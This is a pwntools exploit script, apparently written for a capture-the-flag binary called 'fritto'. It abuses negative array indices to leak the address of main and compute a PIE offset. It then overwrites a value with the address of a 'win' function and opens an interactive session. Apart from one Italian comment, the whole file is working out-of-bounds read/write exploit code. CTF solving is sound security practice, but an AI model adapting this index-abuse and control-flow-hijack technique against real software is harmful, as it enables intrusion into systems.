from pwn import *

el = ELF('/mnt/c/Users/samue/downloads/fritto')

context.binary = el

p = process('/mnt/c/Users/samue/downloads/fritto', cwd='/mnt/c/Users/samue/downloads/')


win = el.symbols['win']

print(win)

# dovrei leggere l'indirizzo del main e fare un offset

ret =p.recvuntil(b'> ')
p.sendline(b'1')
p.sendline(str(-10).encode())
p.recvline()
read = p.recvline().rstrip().split(b' ')[-1]
print(read)

main = int(read, 16)
offset = el.symbols['main'] - main - 241
print(offset)
win = win + offset

ret =p.recvuntil(b'> ')
p.sendline(b'0')
p.sendline(str(-10).encode())
#p.sendline(str(int.from_bytes(p64(win), 'big')).encode())
p.sendline(str(win).encode())
p.interactive()